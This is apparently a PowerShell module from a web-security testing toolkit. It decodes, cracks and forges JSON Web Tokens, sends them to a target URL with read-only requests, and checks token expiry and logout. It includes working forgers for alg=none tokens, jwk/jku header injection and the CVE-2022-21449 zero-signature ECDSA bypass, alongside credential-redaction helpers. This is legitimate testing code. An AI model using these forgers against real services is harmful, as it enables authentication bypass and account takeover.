# JWT decode / forge / crack primitives for Invoke-TcpkJwtCrack (offline) and
# Invoke-TcpkJwtAttack (active). Pure crypto here; the live-probe helper
# (Invoke-TcpkJwtProbe) and the pcap bridge (Get-TcpkJwtFromPcap) live lower in
# this file and lean on _Replay.ps1 (response snapshot/compare) and _Pcap.ps1.
#
# Reuses Convert-TcpkFromB64Url / Convert-TcpkToB64Url from _Entropy.ps1.

# ---------------------------------------------------------------- redaction ----

# Short, non-leaking preview of a token (shows WHICH token, not the whole thing).
function Get-TcpkTokenPreview {
    [CmdletBinding()] param([AllowEmptyString()][string]$Token)
    if ([string]::IsNullOrEmpty($Token)) { return '' }
    if ($Token.Length -le 24) { return $Token.Substring(0, [Math]::Min(6, $Token.Length)) + '...' }
    return $Token.Substring(0, 12) + '...' + $Token.Substring($Token.Length - 6)
}

# Mask credentials in free text (response bodies, evidence, verbose): any JWT, any
# Bearer token, and Authorization / Cookie / Set-Cookie header values. Never let a
# live credential reach a finding, a log, or an exported payload.
function Get-TcpkRedact {
    [CmdletBinding()] param([AllowEmptyString()][string]$Text)
    if ([string]::IsNullOrEmpty($Text)) { return $Text }
    $t = $Text
    $t = [regex]::Replace($t, 'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*', '<jwt-redacted>')
    $t = [regex]::Replace($t, '(?i)(Bearer)\s+[A-Za-z0-9._\-]+', '$1 <redacted>')
    $t = [regex]::Replace($t, '(?im)^(Authorization|Cookie|Set-Cookie):.*$', '$1: <redacted>')
    return $t
}

# ------------------------------------------------------------------ decode ----

# Split + decode a JWT. Never throws: a non-JWT / opaque bearer string yields
# Valid=$false so callers can cleanly skip it (guards a false "not a JWT" match).
function ConvertFrom-TcpkJwt {
    [CmdletBinding()] param([Parameter(Mandatory)][AllowEmptyString()][string]$Token)
    $out = [pscustomobject]@{
        Header = $null; Payload = $null; Parts = @(); Alg = ''
        SigningInput = ''; Valid = $false
    }
    if ([string]::IsNullOrWhiteSpace($Token)) { return $out }
    $parts = $Token.Split('.')
    $out.Parts = $parts
    if ($parts.Count -ne 3) { return $out }            # opaque / not a 3-segment JWT
    $hb = Convert-TcpkFromB64Url -Text $parts[0]
    $pb = Convert-TcpkFromB64Url -Text $parts[1]
    if (-not $hb -or -not $pb) { return $out }
    try {
        $out.Header  = [Text.Encoding]::UTF8.GetString($hb) | ConvertFrom-Json
        $out.Payload = [Text.Encoding]::UTF8.GetString($pb) | ConvertFrom-Json
    } catch { return $out }
    if (-not $out.Header -or -not $out.Header.PSObject.Properties['alg']) { return $out }
    $out.Alg = "$($out.Header.alg)"
    $out.SigningInput = $parts[0] + '.' + $parts[1]
    $out.Valid = $true
    return $out
}

# ------------------------------------------------------------------- sign ----

# HMAC-sign a JWT signing input. Returns the b64url signature segment.
function New-TcpkJwtHmac {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][string]$SigningInput,
        [Parameter(Mandatory)][byte[]]$Key,
        [Parameter(Mandatory)][ValidateSet('HS256', 'HS384', 'HS512')][string]$Alg
    )
    $h = switch ($Alg) {
        'HS256' { [Security.Cryptography.HMACSHA256]::new($Key) }
        'HS384' { [Security.Cryptography.HMACSHA384]::new($Key) }
        'HS512' { [Security.Cryptography.HMACSHA512]::new($Key) }
    }
    try {
        $sig = $h.ComputeHash([Text.Encoding]::ASCII.GetBytes($SigningInput))
        return Convert-TcpkToB64Url -Bytes $sig
    } finally { $h.Dispose() }
}

# Does $Secret (as UTF8 bytes) provably sign THIS token? Constant-time compare of
# the recomputed signature vs the token's own signature -- never early-returns, so
# a dictionary crack cannot be timed.
function Test-TcpkJwtHmacSecret {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][string]$Token,
        [Parameter(Mandatory)][AllowEmptyString()][string]$Secret,
        [Parameter(Mandatory)][ValidateSet('HS256', 'HS384', 'HS512')][string]$Alg
    )
    $jwt = ConvertFrom-TcpkJwt -Token $Token
    if (-not $jwt.Valid) { return $false }
    $calc = New-TcpkJwtHmac -SigningInput $jwt.SigningInput -Key ([Text.Encoding]::UTF8.GetBytes($Secret)) -Alg $Alg
    $given = $jwt.Parts[2]
    # constant-time string compare
    $diff = $calc.Length -bxor $given.Length
    $max = [Math]::Max($calc.Length, $given.Length)
    for ($i = 0; $i -lt $max; $i++) {
        $ca = if ($i -lt $calc.Length)  { [int][char]$calc[$i] }  else { 0 }
        $cb = if ($i -lt $given.Length) { [int][char]$given[$i] } else { 0 }
        $diff = $diff -bor ($ca -bxor $cb)
    }
    return ($diff -eq 0)
}

# Build a token from ordered header/payload. Use [ordered] hashtables so {alg,typ}
# key order is preserved. alg=none (any case) -> "h.p." (empty signature segment).
function New-TcpkJwtToken {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][System.Collections.Specialized.OrderedDictionary]$Header,
        [Parameter(Mandatory)][System.Collections.Specialized.OrderedDictionary]$Payload,
        [Parameter(Mandatory)][string]$Alg,
        [byte[]]$Key
    )
    $h = Convert-TcpkToB64Url -Bytes ([Text.Encoding]::UTF8.GetBytes(($Header  | ConvertTo-Json -Compress -Depth 20)))
    $p = Convert-TcpkToB64Url -Bytes ([Text.Encoding]::UTF8.GetBytes(($Payload | ConvertTo-Json -Compress -Depth 20)))
    $si = "$h.$p"
    if ($Alg -match '^(?i)none$') { return "$si." }
    if (-not $Key) { throw "New-TcpkJwtToken: -Key required for alg $Alg" }
    $sig = New-TcpkJwtHmac -SigningInput $si -Key $Key -Alg $Alg
    return "$si.$sig"
}

# RS256 forge (jwk/jku/x5u header-injection attacks): sign the signing input with
# an attacker RSA private key, RSASSA-PKCS1-v1_5 + SHA-256.
function New-TcpkJwtRs256Token {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][System.Collections.Specialized.OrderedDictionary]$Header,
        [Parameter(Mandatory)][System.Collections.Specialized.OrderedDictionary]$Payload,
        [Parameter(Mandatory)][System.Security.Cryptography.RSA]$Rsa
    )
    $h = Convert-TcpkToB64Url -Bytes ([Text.Encoding]::UTF8.GetBytes(($Header  | ConvertTo-Json -Compress -Depth 20)))
    $p = Convert-TcpkToB64Url -Bytes ([Text.Encoding]::UTF8.GetBytes(($Payload | ConvertTo-Json -Compress -Depth 20)))
    $si = "$h.$p"
    $sig = $Rsa.SignData([Text.Encoding]::ASCII.GetBytes($si),
        [Security.Cryptography.HashAlgorithmName]::SHA256,
        [Security.Cryptography.RSASignaturePadding]::Pkcs1)
    return "$si." + (Convert-TcpkToB64Url -Bytes $sig)
}

# ES* token. Normal sign uses IEEE-P1363 (raw r||s) as JWT requires. -Psychic
# forges the CVE-2022-21449 all-zero (r=s=0) signature of the correct length.
function New-TcpkJwtEs256Token {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][System.Collections.Specialized.OrderedDictionary]$Header,
        [Parameter(Mandatory)][System.Collections.Specialized.OrderedDictionary]$Payload,
        [Parameter(Mandatory)][System.Security.Cryptography.ECDsa]$Ecdsa,
        [ValidateSet('ES256', 'ES384', 'ES512')][string]$Alg = 'ES256',
        [switch]$Psychic
    )
    $h = Convert-TcpkToB64Url -Bytes ([Text.Encoding]::UTF8.GetBytes(($Header  | ConvertTo-Json -Compress -Depth 20)))
    $p = Convert-TcpkToB64Url -Bytes ([Text.Encoding]::UTF8.GetBytes(($Payload | ConvertTo-Json -Compress -Depth 20)))
    $si = "$h.$p"
    $hashName = switch ($Alg) { 'ES256' { 'SHA256' } 'ES384' { 'SHA384' } 'ES512' { 'SHA512' } }
    if ($Psychic) {
        # r||s length = 2 * ceil(keysize/8): ES256->64, ES384->96, ES512->132
        $coord = [Math]::Ceiling($Ecdsa.KeySize / 8.0)
        $sig = New-Object byte[] (2 * $coord)   # all zeros
    } else {
        # 2-arg SignData returns the IEEE-P1363 (raw r||s) encoding JWT requires (the default
        # for ECDsa); the 3-arg DSASignatureFormat overload is not present on all runtimes.
        $sig = $Ecdsa.SignData([Text.Encoding]::ASCII.GetBytes($si), [Security.Cryptography.HashAlgorithmName]::$hashName)
    }
    return "$si." + (Convert-TcpkToB64Url -Bytes $sig)
}

# Build a JWK (public) object from an RSA key, for the header.jwk injection attack.
function New-TcpkJwkFromRsa {
    [CmdletBinding()] param([Parameter(Mandatory)][System.Security.Cryptography.RSA]$Rsa)
    $pp = $Rsa.ExportParameters($false)
    return @{
        kty = 'RSA'
        n   = Convert-TcpkToB64Url -Bytes $pp.Modulus
        e   = Convert-TcpkToB64Url -Bytes $pp.Exponent
    }
}

# Turn a parsed JWT payload (PSCustomObject from ConvertFrom-Json) back into an
# [ordered] dictionary so attack classes can clone + mutate claims before re-signing.
function ConvertTo-TcpkOrderedDict {
    [CmdletBinding()] param($Obj)
    $d = [ordered]@{}
    if ($null -eq $Obj) { return $d }
    if ($Obj -is [System.Collections.IDictionary]) {
        foreach ($k in $Obj.Keys) { $d[[string]$k] = $Obj[$k] }
    } elseif ($Obj -is [psobject]) {
        foreach ($p in $Obj.PSObject.Properties) { $d[$p.Name] = $p.Value }
    }
    return $d
}

# Flip one byte of a token's signature segment so a signature-verifying server rejects
# it. If the segment is empty (alg=none token), append a junk byte so it is non-empty.
function Get-TcpkBadSigToken {
    [CmdletBinding()] param([Parameter(Mandatory)][string]$Token)
    $p = $Token.Split('.')
    if ($p.Count -ne 3) { return $Token }
    $sig = $p[2]
    if ([string]::IsNullOrEmpty($sig)) { $sig = 'AAAA' }
    else {
        $c = $sig[0]
        $nc = if ($c -eq 'A') { 'B' } else { 'A' }
        $sig = "$nc" + $sig.Substring(1)
    }
    return "$($p[0]).$($p[1]).$sig"
}

# ------------------------------------------------------------------- probe ----

# Send ONE read-only request carrying $Token at $Location and return the shared response
# snapshot (Status/Len/Hash/BodyHead/Redirect from _Replay.ps1). An empty $Token sends no
# credential (the anon baseline). Location: 'header' (Authorization: Bearer), 'cookie:<n>',
# or 'rawheader:<n>'. Read-only methods only.
function Invoke-TcpkJwtProbe {
    [CmdletBinding()]
    param(
        [Parameter(Mandatory)][string]$Url,
        [AllowEmptyString()][string]$Token,
        [string]$Location = 'header',
        [ValidateSet('GET', 'HEAD', 'OPTIONS')][string]$Method = 'GET',
        [string[]]$VolatileFieldRegex,
        [int]$TimeoutSec = 15
    )
    $headers = @{}
    if (-not [string]::IsNullOrEmpty($Token)) {
        if ($Location -ieq 'header') {
            $headers['Authorization'] = "Bearer $Token"
        } elseif ($Location -imatch '^cookie:(.+)$') {
            $headers['Cookie'] = "$($Matches[1])=$Token"
        } elseif ($Location -imatch '^rawheader:(.+)$') {
            $headers[$Matches[1]] = $Token
        } else {
            $headers['Authorization'] = "Bearer $Token"    # default
        }
    }
    return New-TcpkHttpSnapshot -Method $Method -Url $Url -Headers $headers -VolatileFieldRegex $VolatileFieldRegex -TimeoutSec $TimeoutSec
}

# ------------------------------------------------- JWT-from-request-spec bridge ----
#
# Shared by Invoke-TcpkExpiryProbe (K22) and Invoke-TcpkLogoutProbe (K23). They live here
# rather than in either cmdlet's own file because a helper used by two public cmdlets is a
# private helper: every other in-file helper in Public/Exploit serves exactly one cmdlet.
#
# The two answer deliberately different questions and must not be merged. Get-TcpkSpecJwtClaim
# asks "is there a usable DEADLINE", Test-TcpkSpecHasJwt asks "is this structurally a JWT at
# all". A token that is a JWT but has no parseable exp answers no to the first and yes to the
# second, and that exact combination is what identifies a credential nothing can expire.

function Get-TcpkSpecJwtClaim {
<#
.SYNOPSIS
    Find the first JWT in a request spec that carries a numeric exp, and return the
    deadline as UTC.

.DESCRIPTION
    Private helper for Invoke-TcpkExpiryProbe. Looks in the Authorization header first
    (with or without a Bearer prefix) and then in each cookie value, because plenty of
    thick clients put the access token in a cookie rather than a header.

    Returns $null when nothing qualifies, which the caller reports as "no declared
    deadline" rather than treating as a pass. A token whose exp is present but not a
    number is skipped for the same reason: an unparseable deadline is not a deadline.
#>
    [CmdletBinding()]
    param([Parameter(Mandatory)][hashtable]$Spec)

    $candidates = New-Object 'System.Collections.Generic.List[object]'

    if ($Spec.Headers -and $Spec.Headers.Contains('Authorization')) {
        $raw = "$($Spec.Headers['Authorization'])"
        $val = $raw -replace '(?i)^\s*Bearer\s+', ''
        $candidates.Add(@{ Token = $val.Trim(); Where = 'the Authorization header' })
    }

    if ($Spec.Cookies) {
        foreach ($k in $Spec.Cookies.Keys) {
            $candidates.Add(@{ Token = "$($Spec.Cookies[$k])"; Where = "cookie '$k'" })
        }
    }

    foreach ($c in $candidates) {
        if (-not $c.Token) { continue }
        $jwt = ConvertFrom-TcpkJwt -Token $c.Token
        if (-not $jwt.Valid) { continue }
        if (-not $jwt.Payload) { continue }

        # Same coercion Test-TcpkJwt.ps1:71 uses: exp may be absent, non-numeric, or out
        # of FromUnixTimeSeconds range on a crafted token. '-as [int64]' yields $null on
        # anything unparseable instead of throwing, and the conversion is still wrapped
        # because the range check lives inside FromUnixTimeSeconds.
        $pay = $jwt.Payload
        if (-not $pay.PSObject.Properties['exp']) { continue }
        $secs = $pay.exp -as [int64]
        if ($null -eq $secs) { continue }

        $expUtc = $null
        try { $expUtc = ([DateTimeOffset]::FromUnixTimeSeconds($secs)).UtcDateTime } catch { continue }

        return @{
            ExpUtc = $expUtc
            Where  = $c.Where
            Token  = $c.Token
        }
    }

    return $null
}

function Test-TcpkSpecHasJwt {
<#
.SYNOPSIS
    True when the spec carries a structurally valid JWT, regardless of whether it has exp.

.DESCRIPTION
    Private helper for Invoke-TcpkLogoutProbe. Get-TcpkSpecJwtClaim deliberately returns
    nothing for a token with no exp, because its job is to find a deadline. This separates
    the two questions, so "JWT with no expiry" can be told apart from "opaque token" -- the
    first is a permanent credential when logout also fails, the second is not.
#>
    [CmdletBinding()]
    param([Parameter(Mandatory)][hashtable]$Spec)

    $tokens = New-Object 'System.Collections.Generic.List[string]'
    if ($Spec.Headers -and $Spec.Headers.Contains('Authorization')) {
        $tokens.Add(("$($Spec.Headers['Authorization'])" -replace '(?i)^\s*Bearer\s+', '').Trim())
    }
    if ($Spec.Cookies) {
        foreach ($k in $Spec.Cookies.Keys) { $tokens.Add("$($Spec.Cookies[$k])") }
    }

    foreach ($t in $tokens) {
        if (-not $t) { continue }
        $jwt = ConvertFrom-TcpkJwt -Token $t
        if ($jwt.Valid -and $jwt.Payload) { return $true }
    }
    return $false
}
